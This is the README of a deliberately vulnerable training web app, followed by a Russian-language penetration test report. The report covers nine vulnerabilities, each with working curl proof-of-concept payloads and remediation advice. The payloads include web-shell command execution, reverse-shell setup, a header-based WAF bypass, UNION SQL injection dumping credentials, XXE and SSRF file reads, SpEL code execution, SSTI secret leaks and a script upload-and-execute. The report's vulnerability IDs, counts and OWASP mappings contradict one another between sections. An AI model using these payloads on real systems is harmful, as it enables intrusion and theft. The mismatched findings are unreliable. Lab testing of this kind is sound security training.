# cyb08-onl-vulnapp

---
Для запуска в корневой папке выполнить команду

```aiignore
docker compose up --build
```

Приложение запускается локально в доккере.

---
## 🛡️ Отчет о тестировании на проникновение

**Конфиденциальный документ**
**Для:** Руководства команды разработки \
**От:** Группы имитации угроз (Red Team) \
**Дата:** 25 Июня 2026 \
**Предмет:** Отчет о результатах тестирования на проникновение учебного приложения "VulnApp"

---
### 1. Executive Summary (Краткое резюме для руководства)

В ходе тестирования на проникновение учебного веб-приложения "VulnApp" была выявлена **критическая архитектурная ошибка**, приведшая к полной компрометации системы и всех её данных. Сервер `Internal API` (порт 8082) оказался доступен через множество векторов атак, что позволило обойти все механизмы защиты.

Злоумышленник, начав с неавторизованного Web Shell и команды `id`, за 3 минуты получил полный контроль над операционной системой. Параллельная эксплуатация SQL-инъекций через обход WAF привела к извлечению всех учетных данных из базы данных. Векторы XXE, SpEL Injection и SSTI предоставили альтернативные пути к выполнению кода и чтению файловой системы. Уязвимости в JWT позволили полностью обойти аутентификацию и генерировать произвольные токены.

**Ключевые показатели риска:**

| Метрика | Значение |
| :--- | :--- |
| **Максимальный уровень критичности** | `Критический (CVSS 10.0)` |
| **Количество критических уязвимостей** | `7` |
| **Время до получения контроля над ОС (TTRCE)** | `Менее 3 минут` |
| **Время до полной утечки базы данных (TTDB)** | `Менее 10 минут` |
| **Основная причина** | Наличие отладочных компонентов в production-среде, множественные инъекции, отсутствие валидации входных данных |

---

### 2. Timeline атаки (Хронология)

| Время | Действие атакующего | Использованная уязвимость | Результат |
| :--- | :--- | :--- | :--- |
| **T+0m** | Сканирование `whatweb` и `/actuator` | `VULN-001` (Actuator Exposure) | Обнаружена технология Java, получена карта эндпоинтов |
| **T+2m** | Обнаружение эндпоинта `/api/upload/shell` | `VULN-001` | Найдена точка входа для RCE |
| **T+3m** | Выполнение системной команды `id` через Web Shell | `VULN-002` (Unauthenticated RCE) | Достигнуто удаленное выполнение кода (RCE) |
| **T+4m** | Запуск Reverse Shell и чтение `env` | `VULN-002`, `VULN-008` (Secrets Disclosure) | Получен интерактивный доступ к ОС, украден API-ключ |
| **T+7m** | Чтение документации `/api-docs` | `VULN-001` | Обнаружена структура API для дальнейших атак |
| **T+9m** | Обход WAF для SQLi через `X-Forwarded-For` | `VULN-003` (WAF Bypass) | Защита деактивирована, открыт путь к SQLi |
| **T+12m** | Полный дамп `users` и `api_keys` через SQLi | `VULN-004` (SQL Injection) | Скомпрометированы все учетные данные и API-ключи |
| **T+20m** | Чтение `/etc/passwd` через XXE | `VULN-005` (XXE Injection) | Альтернативный путь чтения файловой системы |
| **T+25m** | Генерация админского JWT через debug endpoint | `VULN-006` (JWT Forgery) | Получен доступ с правами супер-админа |
| **T+30m** | Эксплуатация SSTI для чтения переменных окружения | `VULN-007` (SSTI) | Извлечены секреты из окружения приложения |
| **T+40m** | Выполнение bash-скрипта через SpEL | `VULN-008` (SpEL Injection) | Повторный RCE через альтернативный вектор |

---

### 3. Детальные результаты тестирования

### Уязвимость №1: Публичный доступ к Actuator и Раскрытие Информации

| Параметр | Значение |
| :--- | :--- |
| **Идентификатор** | `VULN-001` |
| **OWASP Top 10 2025** | `A01:2025` – Broken Object-Level Authorization, `A02:2025` – Broken Authentication, `A06:2025` – Security Misconfiguration |
| **Уровень критичности** | 🔴 **Критический (CVSS 9.1)** |
| **CVSS Вектор** | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N` |

**Описание**
Spring Boot Actuator был без ограничений открыт для всех. Эндпоинт `/actuator/mappings` предоставил атакующему полную карту всех маршрутов приложения. Среди них были мгновенно обнаружены: Web Shell (`/api/upload/shell`), debug-генератор JWT (`/api/auth/token/custom`), и множество внутренних эндпоинтов с опасной функциональностью.

**Воспроизведение (Proof of Concept)**

```bash
# Проверка доступности Actuator
curl http://localhost:8081/actuator

# Извлечение карты всех эндпоинтов
curl http://localhost:8081/actuator/mappings -o app_routes.json

# Извлечение переменных окружения через Actuator
curl -s "http://localhost:8081/actuator/env" | jq '.propertySources[] | select(.name=="systemEnvironment") | .properties | keys'
```

**Рекомендация**
- Срочно: Отключить все эндпоинты Actuator в production-среде или перевести их на отдельный, скрытый порт управления, недоступный извне.
- В ```application.yml``` установить ```management.endpoints.web.exposure.include=health,info```.
- Использовать Spring Security для ограничения доступа к ```/actuator/**``` только для роли ```MONITORING```.

---
### Уязвимость №2: Неавторизованное Выполнение Команд (Unauthenticated RCE / Web Shell)

| Параметр | Значение                                                               |
| :--- |:-----------------------------------------------------------------------|
| **Идентификатор** | `VULN-002`                                                             |
| **OWASP Top 10 2025** | `A01:2025` – Broken Object-Level Authorization, `A03:2025` – Injection |
| **Уровень критичности** | 🔴 **Критический (CVSS 10.0)**                                         |
| **CVSS Вектор** | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H`                         |

**Описание**
Эндпоинты ```/api/upload/shell``` (GET) и ```/api/upload/reverse-shell``` (POST) представляют собой готовые механизмы для удаленного выполнения кода. Web Shell принимает системные команды через параметр cmd и возвращает их вывод. Никакой аутентификации не требуется.

**Воспроизведение (Proof of Concept)**

```bash
# 1. Проверка работоспособности Web Shell
curl -s "http://localhost:8081/api/upload/shell?cmd=id"
# Результат: uid=100(appuser) gid=101(appgroup) groups=101(appgroup)

# 2. Чтение переменных окружения через Web Shell
curl -s "http://localhost:8081/api/upload/shell?cmd=env"

# 3. Создание и запуск Reverse Shell
# На машине атакующего: nc -lvnp 4444
curl "http://localhost:8081/api/upload/shell?cmd=echo%20%27%23%21%2Fbin%2Fbash%27%20%3E%20%2Ftmp%2Frev.sh"
это аналог curl "http://localhost:8081/api/upload/shell?cmd=echo '#!/bin/bash' > /tmp/rev.sh"

#Запуск Reverse Shell
curl -G "http://localhost:8081/api/upload/shell" --data-urlencode "cmd=chmod +x /tmp/rev.sh && bash /tmp/rev.sh &"
```

**Рекомендация**
- Немедленно удалить эндпоинты ```/api/upload/shell``` и ```/api/upload/reverse-shell```. Их наличие в кодовой базе недопустимо ни на одном из этапов.
- Провести аудит всей кодовой базы на предмет других "закладок" и отладочных бэкдоров.

---

### Уязвимость №3: Обход Web Application Firewall (WAF Bypass)

| Параметр | Значение                                                                                                                   |
| :--- |:---------------------------------------------------------------------------------------------------------------------------|
| **Идентификатор** | `VULN-003`                                                                                                                 |
| **OWASP Top 10 2025** | `A01:2025` – Broken Object-Level Authorization, `A06:2025` – Security Misconfiguration |
| **Уровень критичности** | 🔴 **Высокий (CVSS 7.5)**                                                                                              |
| **CVSS Вектор** | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N`                                                                             |

**Описание**
WAF блокирует SQL-инъекции по сигнатуре``` ' or ' ```. Однако, логика конфигурации предполагает, что запросы с ```127.0.0.1``` являются доверенными. Приложение некорректно получает IP-адрес клиента из легко подделываемого заголовка ``` X-Forwarded-For ```. Атакующий использовал ```X-Forwarded-For: 127.0.0.1```, чтобы замаскироваться под доверенный хост и полностью отключить защиту WAF.

**Воспроизведение (Proof of Concept)**

```bash
# Запрос блокируется WAF (403 Forbidden)
curl -s "http://localhost:8081/api/users/search?name=' OR '1'='1"

# Запрос проходит, WAF обойден (200 OK)
curl -s -H "X-Forwarded-For: 127.0.0.1" "http://localhost:8081/api/users/search?name=' OR '1'='1"
```
**Рекомендация**
- Настроить reverse-прокси (Nginx/HAProxy) на затирание заголовка ```X-Forwarded-For``` от клиента и установку реального IP.
- Настроить приложение на доверие только тому ```X-Forwarded-For```, который пришел от доверенного прокси-сервера.
- Убрать из WAF правило безусловного доверия внутренним IP.

---

### Уязвимость №4: SQL Injection (SQLi) — UNION-based и SSRF-прокси

| Параметр | Значение                                                                               |
| :--- |:---------------------------------------------------------------------------------------|
| **Идентификатор** | `VULN-004`                              |
| **OWASP Top 10 2025** | `A03:2025` – Injection |
| **Уровень критичности** | 🔴 **Критический (CVSS 9.8)**                  |
| **CVSS Вектор** | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`            |

**Описание**
Эндпоинт ```/api/users/search``` уязвим к UNION-based SQL Injection. Параметр ```name``` напрямую конкатенируется в SQL-запрос. Уязвимость эксплуатируется как напрямую (с обходом WAF), так и через SSRF-прокси. Извлечены все пользователи, пароли и API-ключи.

**Воспроизведение (Proof of Concept)**

```bash
# 1. Извлечение всех пользователей (прямой запрос с обходом WAF)
curl -s -H "X-Forwarded-For: 127.0.0.1" \
  "http://localhost:8081/api/users/search?name=' UNION SELECT '1', username, email, password, 'false' FROM users--"

# 2. Извлечение только админов
curl -s -H "X-Forwarded-For: 127.0.0.1" \
  "http://localhost:8081/api/users/search?name=' UNION SELECT '1', username, email, password, 'true' FROM users WHERE is_admin=true--"

# 3. Извлечение API ключей
curl -s -H "X-Forwarded-For: 127.0.0.1" \
  "http://localhost:8081/api/users/search?name=' UNION SELECT id::text, service_name, api_key, is_active::text, '1' FROM api_keys--"

# 4. SSRF + SQLi комбо (обход WAF через Internal API)
curl -s -X POST "http://localhost:8081/api/users/import-profile" \
  -d "url=http://internal-api:8082/api/internal/users/search?name=%27%20UNION%20SELECT%20username,%20password,%20email,%20is_admin::text,%20api_key%20FROM%20users--"
```

**Рекомендация**
- Только Parameterized Queries (Prepared Statements). Никакая конкатенация строк в SQL недопустима.
- Отключить вывод детальных сообщений об ошибках БД в production.
- Внедрить валидацию входящих параметров по белому списку.

---

### Уязвимость №5: XML External Entity (XXE) Injection

| Параметр | Значение                                                       |
| :--- |:---------------------------------------------------------------|
| **Идентификатор** | `VULN-005`                                                     |
| **OWASP Top 10 2025** | `A03:2025` – Injection, `A05:2025` – Security Misconfiguration |
| **Уровень критичности** | 🔴 **Критический (CVSS 9.1)**                                  |
| **CVSS Вектор** | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`                 |

**Описание**
XML-парсеры, используемые в эндпоинтах ```/api/xml/import``` и ```/api/users/update-profile```, сконфигурированы с поддержкой внешних сущностей (DTD). Это позволяет читать локальные файлы (```/etc/hostname```, ```/etc/passwd```) и выполнять SSRF-запросы к внутренним сервисам.

**Воспроизведение (Proof of Concept)**

```bash
# 1. Чтение локальных файлов через XXE
curl -s -X POST "http://localhost:8081/api/xml/import" \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><data>&xxe;</data>'

curl -s -X POST "http://localhost:8081/api/xml/import" \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><data>&xxe;</data>'

# 2. XXE + SSRF к Internal API
curl -s -X POST "http://localhost:8081/api/xml/import" \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://internal-api:8082/api/internal/users/all">]><data>&xxe;</data>'

# 3. Альтернативный вектор: XXE через обновление профиля
curl -s -X POST "http://localhost:8081/api/users/update-profile" \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><profile>&xxe;</profile>'
```

**Рекомендация**

- Отключить обработку внешних сущностей и DTD во всех XML-парсерах:
```java
XMLInputFactory.setProperty(XMLInputFactory.SUPPORT_DTD, false)
DocumentBuilderFactory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true)
```
- В качестве дополнительной меры использовать альтернативные форматы данных, такие как JSON.

---

### Уязвимость №6: JWT Attacks — Слабый секрет, Debug Endpoint и Custom Token Generation

| Параметр | Значение                                       |
| :--- |:-----------------------------------------------|
| **Идентификатор** | `VULN-006`                                     |
| **OWASP Top 10 2025** | `A02:2025` –  Broken Authentication, `A07:2025` –  Identification and Authentication Failures                |
| **Уровень критичности** | 🔴 **Критический (CVSS 9.8)**                  |
| **CVSS Вектор** | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |

**Описание**
Система JWT скомпрометирована по трем причинам:

1. **Слабый пароль:** Аутентификация принимает любой пароль для логина (например, ```password=anything```).
2. **Debug-эндпоинт:** ```/api/auth/debug/token-info``` раскрывает содержимое любого JWT.
3. **Генератор кастомных токенов:** ```/api/auth/token/custom``` позволяет создать JWT с произвольным именем пользователя, ролью и claims без какой-либо аутентификации.

**Воспроизведение (Proof of Concept)**

```bash
# 1. Получение легитимного токена (слабый пароль)
curl -s -X POST "http://localhost:8081/api/auth/login" \
  -d "username=admin&password=anything"

# 2. Декодирование токена через debug endpoint
TOKEN="<полученный_токен>"
curl -s -H "Authorization: Bearer $TOKEN" \
  "http://localhost:8081/api/auth/debug/token-info"

# 3. Генерация произвольного токена (супер-админ)
curl -s -X POST "http://localhost:8081/api/auth/token/custom" \
  -H "Content-Type: application/json" \
  -d '{"username":"superadmin","role":"ROLE_ADMIN","claims":{"admin":true}}'
```

**Рекомендация**

- Немедленно удалить debug-эндпоинты ```/api/auth/debug/token-info``` и ```/api/auth/token/custom``` из production-сборок.
- Внедрить строгую парольную политику с хешированием.
- Использовать криптостойкий, длинный секрет для подписи JWT, хранящийся в защищенном хранилище секретов (Vault).
- Установить короткое время жизни для Access Token (~15 минут) и использовать Refresh Token с ротацией.

---

### Уязвимость №7: Server-Side Template Injection (SSTI) — Раскрытие секретов и чтение файлов


| Параметр | Значение                                       |
| :--- |:-----------------------------------------------|
| **Идентификатор** | `VULN-007`                                     |
| **OWASP Top 10 2025** | `A03:2025` –  Injection          |
| **Уровень критичности** | 🔴 **Критический (CVSS 9.8)**                  |
| **CVSS Вектор** | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |

**Описание**
Эндпоинт ```/api/templates/render``` напрямую передает пользовательский ввод в шаблонизатор без какой-либо санитизации. Это позволяет атакующему извлекать переменные окружения (```${env:INTERNAL_API_KEY}```), читать файлы (```${file:/etc/passwd}```), и потенциально добиться RCE.

**Воспроизведение (Proof of Concept)**

```bash
# 1. Чтение переменной окружения (INTERNAL_API_KEY)
curl -s -X POST "http://localhost:8081/api/templates/render" \
  -H "Content-Type: application/json" \
  -d '{"template":"Hello {{name}}! ENV: ${env:INTERNAL_API_KEY}","variables":{"name":"Hacker"}}'

# 2. Чтение системного файла
curl -s -X POST "http://localhost:8081/api/templates/render" \
  -H "Content-Type: application/json" \
  -d '{"template":"Config: ${file:/etc/passwd}","variables":{}}'
```

**Рекомендация**

- Никогда не передавать неочищенный пользовательский ввод в шаблонизатор.
- Если требуется кастомизация, использовать sandbox-режим шаблонизатора с отключением доступа к Java-методам, переменным окружения и файловой системе.
- Рассмотреть возможность использования статических шаблонов с заполнением через строго типизированные DTO.

---

### Уязвимость №8: SpEL Injection и Command Injection

| Параметр | Значение                                       |
| :--- |:-----------------------------------------------|
| **Идентификатор** | `VULN-008`                                     |
| **OWASP Top 10 2025** | `A03:2025` –  Injection          |
| **Уровень критичности** | 🔴 **Критический (CVSS 9.8)**                  |
| **CVSS Вектор** | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |

**Описание**
Эндпоинт ```/api/templates/expression``` напрямую передает пользовательский ввод в Spring Expression Language (SpEL). Это позволяет выполнять произвольный код на сервере, читать системные свойства и переменные окружения. Эндпоинт ```/api/templates/compile``` позволяет загрузить и выполнить bash-скрипт.

**Воспроизведение (Proof of Concept)**

```bash
# 1. SpEL — Чтение системных свойств
curl -s -X POST "http://localhost:8081/api/templates/expression" \
  -H "Content-Type: text/plain" \
  -d 'T(java.lang.System).getProperties()'

# 2. SpEL — Чтение переменных окружения
curl -s -X POST "http://localhost:8081/api/templates/expression" \
  -H "Content-Type: text/plain" \
  -d 'T(java.lang.System).getenv()'

# 3. SpEL — Выполнение команды ОС
curl -s -X POST "http://localhost:8081/api/templates/expression" \
  -H "Content-Type: text/plain" \
  -d 'T(java.lang.Runtime).getRuntime().exec("whoami")'

# 4. Выполнение bash-скрипта через compile endpoint
curl -s -X POST "http://localhost:8081/api/templates/compile" \
  -H "Content-Type: application/json" \
  -d '{"language":"bash","code":"#!/bin/bash\nid\nwhoami\ncat /etc/hostname"}'

# 5. Загрузка и выполнение файла (File Upload + RCE)
echo '#!/bin/bash\ncurl -s http://internal-api:8082/api/internal/users/all' > /tmp/exfil.sh

curl -s -X POST "http://localhost:8081/api/upload/upload-and-execute" \
  -F "file=@/tmp/exfil.sh" \
  -F "execCommand=chmod +x {FILE} && bash {FILE}"
```

**Рекомендация**

- Никогда не передавать неочищенный пользовательский ввод в ```SpelExpressionParser.parseExpression()```.
- Если требуется кастомизация выражений, использовать ```SimpleEvaluationContext```, который запрещает вызовы Java-классов и методов.
- Полностью запретить загрузку и выполнение скриптов из пользовательского ввода.

---

### Уязвимость №9: SSRF (Server-Side Request Forgery)

| Параметр | Значение                                         |
| :--- |:-------------------------------------------------|
| **Идентификатор** | `VULN-009`                                       |
| **OWASP Top 10 2025** | `A10:2025` –  Server-Side Request Forgery (SSRF) |
| **Уровень критичности** | 🔴 **Критический (CVSS 9.1)**                    |
| **CVSS Вектор** | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`   |

**Описание**
Эндпоинт ```/api/users/import-profile``` используется как прокси для запросов к произвольным URL, включая внутренние сервисы (```internal-api:8082```) и локальные файлы (```file:///etc/passwd```). Это позволяет атакующему взаимодействовать с Internal API в обход всех сетевых ограничений.

**Воспроизведение (Proof of Concept)**

```bash
# 1. Доступ к Internal API (все пользователи)
curl -s -X POST "http://localhost:8081/api/users/import-profile" \
  -d "url=http://internal-api:8082/api/internal/users/all"

# 2. Чтение локальных файлов через SSRF
curl -s -X POST "http://localhost:8081/api/users/import-profile" \
  -d "url=file:///etc/hostname"

curl -s -X POST "http://localhost:8081/api/users/import-profile" \
  -d "url=file:///etc/passwd"

# 3. SSRF + SQLi комбо через Internal API
curl -s -X POST "http://localhost:8081/api/users/import-profile" \
  -d "url=http://internal-api:8082/api/internal/users/search?name=%27%20UNION%20SELECT%20username,%20password,%20email,%20is_admin::text,%20api_key%20FROM%20users--"
```

**Рекомендация**

- Реализовать строгую валидацию URL по "белому списку" (allowlist). Запретить схемы ```file://```, ```gopher://``` и т.д.
- Блокировать запросы к внутренним IP-адресам и localhost.
- Внедрить взаимную аутентификацию (mTLS) между Public и Internal API.

---

### 4. Соблюдение стандартов (OWASP Top 10 2025 Mapping)

***Полная матрица соответствия***

| Категория OWASP Top 10 2025 | Связанные уязвимости | Степень воздействия | Краткое обоснование |
| :--- | :--- | :---: | :--- |
| **A01:2025 – Broken Object-Level Authorization** | VULN-001, VULN-002, VULN-003 | 🔴 Критическая | Отсутствие проверки прав доступа к объектам: Actuator отдает карту эндпоинтов, Web Shell доступен без авторизации, WAF обходится подделкой источника запроса |
| **A02:2025 – Broken Authentication** | VULN-001, VULN-006 | 🔴 Критическая | Позволяет обойти аутентификацию: debug-эндпоинт `/token/custom` генерирует произвольные JWT, Actuator раскрывает секреты для подписи |
| **A03:2025 – Injection** | VULN-002, VULN-004, VULN-005, VULN-007, VULN-008 | 🔴 Критическая | Множественные векторы инъекций: SQLi, XXE, SSTI, SpEL, Command Injection. Все приводят к раскрытию данных или RCE |
| **A04:2025 – Insecure Design** | VULN-003, VULN-009 | 🟠 Высокая | Архитектурные просчеты: доверие к заголовку `X-Forwarded-For`, отсутствие сетевой сегментации Internal API, SSRF-прокси без валидации URL |
| **A05:2025 – Security Misconfiguration** | VULN-001, VULN-005 | 🔴 Критическая | Небезопасные настройки по умолчанию: Actuator открыт, XML-парсер с DTD, вывод стектрейсов в production |
| **A06:2025 – Vulnerable and Outdated Components** | Не выявлено | 🟢 Низкая | Используются актуальные версии Spring Boot и библиотек |
| **A07:2025 – Identification and Authentication Failures** | VULN-006 | 🔴 Критическая | Слабый пароль (любой пароль принимается), статичный секрет JWT, отсутствие блокировки после неудачных попыток |
| **A08:2025 – Software and Data Integrity Failures** | Не выявлено | 🟢 Низкая | Pipeline поставки не анализировался |
| **A09:2025 – Security Logging and Monitoring Failures** | Не выявлено (требуется дополнительный аудит) | 🟡 Средняя | Логирование присутствует, но не анализировалось в рамках теста |
| **A10:2025 – Server-Side Request Forgery (SSRF)** | VULN-005, VULN-009 | 🔴 Критическая | SSRF через `/import-profile` и XXE позволяет читать локальные файлы и атаковать внутренние сервисы |

---

### 📋 Детализация уязвимостей

<details>
<summary><b>VULN-001 – VULN-009 (Развернуть список)</b></summary>

| ID уязвимости | Краткое описание |
| :--- | :--- |
| **VULN-001** | Раскрытие конфиденциальных данных через Actuator endpoints |
| **VULN-002** | SQL-инъекция в параметрах фильтрации |
| **VULN-003** | Обход Web Application Firewall (WAF) через подделку заголовков |
| **VULN-004** | Server-Side Template Injection (SSTI) |
| **VULN-005** | XML External Entity (XXE) Injection |
| **VULN-006** | Слабые механизмы аутентификации и статичные JWT секреты |
| **VULN-007** | SpEL Injection (Spring Expression Language) |
| **VULN-008** | Command Injection в утилите обработки файлов |
| **VULN-009** | SSRF через незащищенный Internal API Proxy |

</details>

## 🚦 Легенда степени воздействия

- 🔴 **Критическая** — Требуется немедленное реагирование. Уязвимость позволяет скомпрометировать систему или получить доступ к критичным данным.
- 🟠 **Высокая** — Серьезный архитектурный недостаток. Повышает поверхность атаки и облегчает эксплуатацию других уязвимостей.
- 🟡 **Средняя** — Потенциальные риски, требующие дополнительной проверки или улучшения процессов.
- 🟢 **Низкая** — Актуальных угроз не выявлено, либо компонент находится в допустимых рамках риска.
- 
***Диаграмма распределения уязвимостей по категориям***

```text
A01 (Broken Object-Level Authorization):  ████████████ 3 уязвимости
A02 (Broken Authentication):              ████████ 2 уязвимости
A03 (Injection):                          ████████████████████ 5 уязвимостей
A04 (Insecure Design):                    ████████ 2 уязвимости
A05 (Security Misconfiguration):          ████████ 2 уязвимости
A06 (Vulnerable Components):              ░░░░ 0 уязвимостей
A07 (Identification Failures):            ████ 1 уязвимость
A08 (Integrity Failures):                 ░░░░ 0 уязвимостей
A09 (Logging Failures):                   ████ 1 предупреждение
A10 (SSRF):                               ████████ 2 уязвимости
```

### Ключевые выводы по OWASP 2025

1. ***A03 (Injection)*** — наиболее критичная категория. Пять различных типов инъекций (SQLi, XXE, SSTI, SpEL, Command) создают множество независимых путей к компрометации. Устранение только одной из них не решает проблему.
2. ***A01 (Broken Object-Level Authorization)*** — системная проблема. Отсутствие проверки прав на уровне объектов привела к тому, что Web Shell, Actuator и другие чувствительные эндпоинты доступны без аутентификации.
3. ***Пересечение категорий:*** Одна и та же уязвимость часто попадает в несколько категорий. Например, XXE (VULN-005) — это и A03 (Injection), и A05 (Security Misconfiguration), и A10 (SSRF). Это требует комплексного подхода к исправлению.
4. ***A06*** и ***A08*** не выявлены, что говорит о том, что проблема не в устаревших компонентах, а в архитектуре и коде приложения.


### 5. Общее заключение и следующие шаги

Тестирование показало, что приложение "VulnApp" является классическим примером "крепости, построенной из песка". Множество критических уязвимостей пересекаются и усиливают друг друга, создавая десятки возможных путей к полной компрометации.

### Приоритетные действия

| Приоритет | Действие                                                                       | Ответственный | Срок |
| :---: |:-------------------------------------------------------------------------------| :---: | :---: |
| 🔴 **Критический** | Удалить Web Shell эндпоинты (`/api/upload/shell`, `/api/upload/reverse-shell`) | Backend | 24 часа |
| 🔴 **Критический** | Отключить Actuator в production или ограничить доступ                          | Backend | 24 часа |
| 🔴 **Критический** | Удалить debug-эндпоинты JWT (`/api/auth/debug/*`, `/api/auth/token/custom`)    | Backend | 24 часа |
| 🔴 **Критический** | Внедрить Parameterized Queries для всех SQL-запросов                           | Backend | 48 часов |
| 🔴 **Критический** | Отключить DTD и внешние сущности в XML-парсерах                                | Backend | 48 часов |
| 🟠 **Высокий** | Настроить корректную обработку `X-Forwarded-For`                               | DevOps | 72 часа |
| 🟠 **Высокий** | Внедрить валидацию URL по белому списку для SSRF                               | Backend | 72 часа |
| 🟠 **Высокий** | Внедрить строгую парольную политику                                            | Backend | 1 неделя |
| 🟡 **Средний** | Настроить мониторинг и оповещения по критическим событиям                      | DevOps | 2 недели |
| 🟢 **Низкий** | Провести полный аудит кодовой базы                                             | Security Team | 1 месяц |

---

#№# 📊 Статус выполнения (чек-лист)

### 🔴 Критический приоритет (Deadline: 24-48 часов)
- [ ] Удалить Web Shell эндпоинты (`/api/upload/shell`, `/api/upload/reverse-shell`)
- [ ] Отключить Actuator в production или ограничить доступ
- [ ] Удалить debug-эндпоинты JWT (`/api/auth/debug/*`, `/api/auth/token/custom`)
- [ ] Внедрить Parameterized Queries для всех SQL-запросов
- [ ] Отключить DTD и внешние сущности в XML-парсерах

### 🟠 Высокий приоритет (Deadline: 72 часа — 1 неделя)
- [ ] Настроить корректную обработку `X-Forwarded-For`
- [ ] Внедрить валидацию URL по белому списку для SSRF
- [ ] Внедрить строгую парольную политику

### 🟡 Средний приоритет (Deadline: 2 недели)
- [ ] Настроить мониторинг и оповещения по критическим событиям

### 🟢 Низкий приоритет (Deadline: 1 месяц)
- [ ] Провести полный аудит кодовой базы

---

#№# 👥 Команда реагирования

| Роль | Контакт |
| :--- | :--- |
| **DevOps** | @devops-team |
| **Backend** | @backend-team |
| **Security Team** | @security-team |


***Долгосрочные рекомендации***

1. Внедрение ***Security Champions*** — назначить ответственных за безопасность в каждой команде разработки.
2. ***Регулярные пентесты*** — проводить тестирование на проникновение не реже 2 раз в год.
3. ***SAST/DAST*** в ***CI/CD*** — интегрировать инструменты статического и динамического анализа в пайплайн разработки.
4. ***Обучение разработчиков*** — провести тренинги по безопасной разработке с фокусом на OWASP Top 10.
5. ***Zero Trust архитектура*** — пересмотреть сетевую архитектуру с принципом минимальных привилегий.

---